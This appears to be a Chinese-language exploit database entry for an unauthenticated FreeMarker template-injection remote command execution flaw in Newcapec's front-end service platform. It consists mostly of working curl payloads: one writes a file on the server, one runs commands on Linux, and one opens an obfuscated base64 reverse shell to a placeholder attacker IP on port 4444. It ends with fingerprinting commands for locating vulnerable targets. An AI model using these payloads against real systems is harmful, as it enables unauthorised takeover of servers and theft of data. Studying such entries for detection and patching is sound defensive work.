---
id: NEWCAPEC-SSTI-RCE
title: 新开普前置服务管理平台 service.action FreeMarker SSTI 远程命令执行漏洞
product: newcapec
vendor: 新开普
version_affected: "前置服务管理平台"
severity: CRITICAL
tags: [rce, ssti, 无需认证, 国产]
fingerprint: ["掌上校园", "新开普", "前置服务管理平台"]
---

## 漏洞描述

新开普前置服务管理平台的 `/service_transport/service.action` 接口存在 FreeMarker 模板注入漏洞。`UnitCode` 参数的值被传入 FreeMarker 模板引擎渲染，攻击者可注入 FreeMarker 表达式执行任意系统命令。

## 影响版本

- 新开普前置服务管理平台

## 前置条件

- 无需认证

## 利用步骤

1. 向 `/service_transport/service.action` 发送 POST 请求
2. 在 `UnitCode` 字段中注入 FreeMarker SSTI 表达式
3. 命令在服务器端执行

## Payload

### Windows 命令执行（写入文件验证）

```bash
curl -s "http://target/service_transport/service.action" \
  -H "Content-Type: application/json" \
  -d '{"command":"GetFZinfo","UnitCode":"<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd /c echo pwned > ./webapps/ROOT/test.txt\")}"}'
```

### 读取验证文件

```bash
curl -s "http://target/test.txt"
```

### Linux 命令执行

```bash
curl -s "http://target/service_transport/service.action" \
  -H "Content-Type: application/json" \
  -d '{"command":"GetFZinfo","UnitCode":"<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"}'
```

### 反弹 Shell

```bash
curl -s "http://target/service_transport/service.action" \
  -H "Content-Type: application/json" \
  -d '{"command":"GetFZinfo","UnitCode":"<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}\")}"}'
```

## 验证方法

```bash
# 写入文件后访问
curl -s "http://target/service_transport/service.action" \
  -H "Content-Type: application/json" \
  -d '{"command":"GetFZinfo","UnitCode":"<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd /c echo pwned > ./webapps/ROOT/ssti_test.txt\")}"}'
curl -s "http://target/ssti_test.txt" | grep "pwned"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "掌上校园\|新开普\|前置服务"
```
